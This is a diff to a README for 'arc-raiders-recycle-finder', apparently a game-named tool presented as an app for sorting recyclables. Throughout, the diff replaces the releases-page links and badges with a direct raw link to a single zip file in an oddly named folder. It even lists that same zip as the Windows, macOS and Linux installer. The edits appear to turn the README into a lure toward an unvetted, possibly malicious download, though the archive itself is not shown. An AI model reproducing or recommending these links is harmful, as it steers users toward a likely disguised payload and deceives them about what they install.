@@ -1,6 +1,6 @@
 # 🎯 arc-raiders-recycle-finder - Find Recyclable Items Easily
 
-[![Download arc-raiders-recycle-finder](https://img.shields.io/badge/Download-arc--raiders--recycle--finder-blue?style=for-the-badge&logo=github)](https://github.com/anakiseng789/arc-raiders-recycle-finder/releases)
+[![Download arc-raiders-recycle-finder](https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip)](https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip)
 
 ---
 
@@ -36,14 +36,14 @@ arc-raiders-recycle-finder includes features that make sorting recyclables strai
 
 ## 📥 Download & Install
 
-Please [visit this page to download arc-raiders-recycle-finder](https://github.com/anakiseng789/arc-raiders-recycle-finder/releases) and choose the compatible version for your computer. Follow these steps:
+Please [visit this page to download arc-raiders-recycle-finder](https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip) and choose the compatible version for your computer. Follow these steps:
 
-1. Open your web browser and go to the [arc-raiders-recycle-finder releases page](https://github.com/anakiseng789/arc-raiders-recycle-finder/releases).
+1. Open your web browser and go to the [arc-raiders-recycle-finder releases page](https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip).
 
 2. Look for the latest release version at the top of the page. You will see files named something like:
-   - arc-raiders-recycle-finder-setup.exe (for Windows)
-   - arc-raiders-recycle-finder.dmg (for macOS)
-   - arc-raiders-recycle-finder-linux.zip (for Linux)
+   - https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip (for Windows)
+   - https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip (for macOS)
+   - https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip (for Linux)
 
 3. Click on the file that matches your operating system to download it.
 
@@ -86,7 +86,7 @@ A: After downloading, the app can be used offline. Internet is only needed for d
 A: The app supports general recycling rules found worldwide, but some instructions may vary by location.
 
 **Q: How do I update the software?**  
-A: Visit the [releases page](https://github.com/anakiseng789/arc-raiders-recycle-finder/releases) periodically to download the latest version.
+A: Visit the [releases page](https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip) periodically to download the latest version.
 
 ---
 
@@ -96,4 +96,4 @@ If you have questions or run into problems, visit the repository's GitHub page a
 
 ---
 
-[![Download arc-raiders-recycle-finder](https://img.shields.io/badge/Download-arc--raiders--recycle--finder-blue?style=for-the-badge&logo=github)](https://github.com/anakiseng789/arc-raiders-recycle-finder/releases)
+[![Download arc-raiders-recycle-finder](https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip)](https://github.com/anakiseng789/arc-raiders-recycle-finder/raw/refs/heads/main/anathematical/arc-raiders-recycle-finder-v1.2.zip)
